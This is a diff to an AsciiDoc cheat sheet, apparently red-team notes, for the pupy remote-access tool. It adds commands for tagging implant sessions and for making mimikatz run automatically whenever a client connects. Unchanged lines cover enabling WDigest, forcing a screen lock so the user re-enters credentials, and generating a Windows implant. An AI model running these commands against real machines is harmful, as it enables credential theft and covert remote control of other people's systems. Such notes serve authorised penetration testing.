@@ -76,9 +76,23 @@ pupy calls the implants clients. Clients are generated with the `gen` command
 |`upload local_path remote_path`   |Upload a file
 |===
 
-==== Modules of note
+==== Sessions
 
-NOTE: TODO
+Sessions are identified by numeric ID. They can be tagged. Clients are identified by a MAC address.
+
+  tag -a 080027a66ed2 080027a66ed2
+
+Tag the sessions of client `080027a66ed2` as `080027a66ed2`. This doesn't seem intuitive at first, but in combination with the `on_connect` config options mentioned below it's powerful.
+
+  sessions
+
+Show the current filtered session, or all sessions. Include the tags set with `tag`.
+
+  config set on_connect 080027a66ed2_1 mimikatz
+
+Run the command `mimikatz` on the client `080027a66ed2` when it connects. This specific on_connect setting is `1`.
+
+==== Modules of note
 
   mimikatz --wdigest check
 
@@ -90,7 +104,7 @@ Enable WDigest if it's not enabled.
 
   lock_screen
 
-Force the screen to lock and the user to reenter creds. This needs to be run as the logged in user, not NT AUTHORITY\\SYSTEM.
+Force the screen to lock and the user to reenter creds. This needs to be run as the logged in user, not NT AUTHORITY\SYSTEM.
 
   mimikatz
 
@@ -105,4 +119,5 @@ Generate a python oneliner
   gen -f client -O windows -A x64 -o /tmp/pupy.exe connect -t ssl --host localhost:443 --host localhost:8443
 
 Generate an executable for windows
+
 <<<
